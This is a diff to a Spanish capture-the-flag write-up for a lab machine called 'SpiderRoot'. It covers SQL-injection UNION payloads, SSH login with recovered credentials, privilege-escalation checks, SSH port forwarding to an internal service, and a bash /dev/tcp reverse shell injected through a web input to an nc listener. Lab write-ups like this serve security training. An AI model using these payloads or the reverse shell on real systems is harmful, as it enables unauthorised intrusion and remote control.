@@ -174,17 +174,146 @@ admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
 
+
+
 ![Nmap Scan](images/SpiderRoot/9.png)
 
 
+
+
+
 Pues vemos que ha funcionado, nos vamos a la página e introducimos la query:
+
+
+
 
 
 ![Nmap Scan](images/SpiderRoot/10.png)
 
 
 
+
+
+
+
 ![Nmap Scan](images/SpiderRoot/11.png)
+
+
+ya tenemos unos user y unos pass para intentar conectarnos por SSH, al ser pocos no utilizo hydra, directamente ensayo y error:
+
+```bash
+ssh peter@172.17.0.2
+```
+
+y aquí lo tenemos `peter:sp1der`
+
+![Nmap Scan](images/SpiderRoot/12.png)
+
+
+
+## ESCALADA DE PRIVILEGIOS
+
+Empezamos mirando si pertenecemos a algún grupo privilegiado `id` , después si tenemos algún privilegio sudo `sudo -l`, si hay algún bit SUID `find / -perm -4000 2>/dev/null`
+
+![Nmap Scan](images/SpiderRoot/13.png)
+
+
+No encontramos nada, vamosa mirar puertos internos abiertos `ss -tulnp`
+
+```
+Netid                   State                    Recv-Q                   Send-Q                                      Local Address:Port                                       Peer Address:Port                   Process                   
+tcp                     LISTEN                   0                        511                                               0.0.0.0:80                                              0.0.0.0:*                                                
+tcp                     LISTEN                   0                        128                                               0.0.0.0:22                                              0.0.0.0:*                                                
+tcp                     LISTEN                   0                        511                                             127.0.0.1:8080                                            0.0.0.0:*                                                
+tcp                     LISTEN                   0                        128                                                  [::]:22                                                 [::]:*
+```
+
+
+
+![Nmap Scan](images/SpiderRoot/14.png)
+
+
+Tenemos el puerto 8080 pero solo accesible desde la máquina victima, de momento vamos a hacer un curl para ver más o menos de que va la cosa:
+```bash
+curl 127.0.0.1:8080
+```
+
+Vemos algo muy interesante:
+
+
+
+![Nmap Scan](images/SpiderRoot/15.png)
+
+
+
+tenemos que hacer port forwarding para llegar a ese puerto abierto como sea, dado que tiene ssh no voy a usar chisel, me voy a mi máquina atacante:
+
+
+```bash
+ssh -L 9000:127.0.0.1:8080 peter@172.17.0.2
+```
+
+explico el comando:
+ssh-->protocolo
+-L --> port forwarding
+9000:127.0.0.1:8080 --> mi puerto 9000 es el 8080 del localhost (victima)
+peter@172.17.0.2 --> como quien nos conectamos por ssh
+puse el puerto 9000 en vez del mismo de la máquina (8080) por si tengo que usar burp suite que utiliza ese puerto y crea conflicto
+
+
+
+
+![Nmap Scan](images/SpiderRoot/16.png)
+
+
+Me voy al navegador:
+
+
+
+
+![Nmap Scan](images/SpiderRoot/17.png)
+
+
+En el buscador puse localhost que es lo mismo que  127.0.0.1  eso si, acordaros de poner el puerto.
+
+
+Ahora hay que mandarnos una reverse shell:
+
+
+![Nmap Scan](images/SpiderRoot/18.png)
+
+nos ponemos en escucha en nuestra máquina atcante por el puerto 4444
+```
+sudo nc -lvnp 4444
+```
+metemos la revshell en el buscador:
+```
+bash -i >& /dev/tcp/172.17.0.1/4444 0>&1
+```
+
+y no nos lo ejecuta porque necesitamos poner bash -c "el comando"
+
+```
+bash -c  "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"
+```
+
+ahora si
+
+
+
+![Nmap Scan](images/SpiderRoot/19.png)
+
+
+
+![Nmap Scan](images/SpiderRoot/20.png)
+
+
+
+Hacemos tratamiento de la TTY
+
+
+
+
 
 
 
